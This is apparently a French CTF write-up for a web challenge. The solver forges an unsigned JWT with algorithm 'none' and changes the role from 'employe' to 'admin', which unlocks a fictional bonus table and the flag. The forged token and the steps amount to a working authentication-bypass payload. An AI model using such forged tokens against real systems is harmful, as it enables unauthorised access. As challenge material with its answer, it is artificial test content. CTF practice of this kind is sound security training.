# Espace Manager

> **CTF** : CyberZerk 2026  
> **Catégorie** : `WEB` · **Points** : 100
> **Difficulté** : Moyen  
> **Auteur** : Perseval

---

## Description

L'espace manager de Tricatel est protégé par un jeton JWT. Votre compte n'est qu'« employé ». Un dev épuisé a bâclé la vérification des jetons une nuit de prod… Forgez-vous un accès admin et récupérez le tableau des primes du CODIR.

## Liens fournis
- [https://manager.cyberzerk.fr](https://manager.cyberzerk.fr)

---
 
## Résolution

Si on regarde le cookie de session nous avons : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZW1wbG95ZTg0NzIiLCJyb2xlIjoiZW1wbG95ZSJ9.s9ip1QaEfGwDjSo2VMn4p3fQ1PEGp8GixtSX-jeg6sM`

Si nous le mettons dans un éditeur `JWT Token` comme **https://www.jwt.io/** nous avons : 

```json
{
  "user": "employe8472",
  "role": "employe"
}
```

Si nous modifions le JSON pour faire : 

```json
{
  "user": "employe8472",
  "role": "admin"
}
```

Cela donne : `eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiZW1wbG95ZTg0NzIiLCJyb2xlIjoiYWRtaW4ifQ.`

Si on le met dans le cookie de session, la page change pour donner : 

```text
Jeton présenté : rôle admin

Tableau des primes du CODIR (réservé aux managers) :

Bénéficiaire	Prime Movember
Directeur Général	42 000 €
DRH	18 500 €
Équipe technique (12 pers.)	0 €

CyberZerk{JWT_4lg_N0n3_C_3st_N0n}
```

---
 
## Flag
 
```
CyberZerk{JWT_4lg_N0n3_C_3st_N0n}
```